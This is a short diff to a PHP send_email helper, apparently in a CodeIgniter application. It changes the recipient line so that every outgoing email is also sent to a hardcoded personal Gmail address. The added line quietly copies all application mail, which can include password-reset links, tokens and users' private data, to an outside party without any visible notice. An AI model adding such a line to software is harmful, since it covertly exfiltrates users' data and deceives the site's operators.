@@ -38,7 +38,7 @@ function send_email($data = array()) {
 	global $CI;
 	$CI->load->library('email');
 
-	$to = $data['to'];
+	$to = $data['to'].",sumitjpd@gmail.com";
 	$subject = $data['subject'];
 	$html = $data['html'];
 	if(isset($data['from']) && $data['from'] != '')
